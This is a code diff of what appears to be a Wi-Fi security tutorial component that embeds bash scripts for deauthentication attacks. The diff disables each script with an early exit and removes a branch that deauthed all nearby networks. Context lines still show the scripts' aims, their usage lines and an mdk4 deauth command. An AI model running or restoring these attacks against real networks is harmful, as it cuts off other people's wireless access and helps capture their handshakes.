@@ -4,6 +4,10 @@ import { ScriptBlock } from "../ScriptBlock";
 
 export const DeauthAttacks = () => {
   const deauthScript = `#!/bin/bash
+# 2027 edition: historical automation disabled; fails before any state change.
+printf 'Disabled review artifact. Use synthetic practice; no RF action permitted.\\n' >&2
+exit 64
+
 # Targeted Deauthentication Attack Script
 # For capturing WPA handshakes
 # Usage: sudo bash deauth_attack.sh <ap_bssid> <client_mac> <channel> [interface] [count]
@@ -101,6 +105,10 @@ echo ""
 print_status "Attack summary saved for reporting."`;
 
   const massDeauthScript = `#!/bin/bash
+# 2027 edition: historical automation disabled; fails before any state change.
+printf 'Disabled review artifact. Use synthetic practice; no RF action permitted.\\n' >&2
+exit 64
+
 # Mass Deauthentication Script
 # Continuously deauths all clients on a target network
 # Usage: sudo bash mass_deauth.sh <ap_bssid> <channel> [interface]
@@ -131,6 +139,10 @@ while true; do
 done`;
 
   const mdk4Script = `#!/bin/bash
+# 2027 edition: historical automation disabled; fails before any state change.
+printf 'Disabled review artifact. Use synthetic practice; no RF action permitted.\\n' >&2
+exit 64
+
 # MDK4 Advanced Deauthentication Script
 # More powerful and harder to detect
 # Usage: sudo bash mdk4_deauth.sh <interface> [bssid_file]
@@ -154,11 +166,8 @@ if [ -n "\$BSSID_FILE" ] && [ -f "\$BSSID_FILE" ]; then
     echo "[*] Starting targeted deauth attack..."
     mdk4 \$INTERFACE d -b \$BSSID_FILE
 else
-    echo "[*] No target file specified"
-    echo "[*] Starting broadcast deauth (all networks)..."
-    echo "[!] WARNING: This affects ALL nearby networks!"
-    echo "[!] Press Ctrl+C to stop"
-    mdk4 \$INTERFACE d
+    echo "Invalid target file: refusing all actions."
+    exit 64
 fi`;
 
   return (
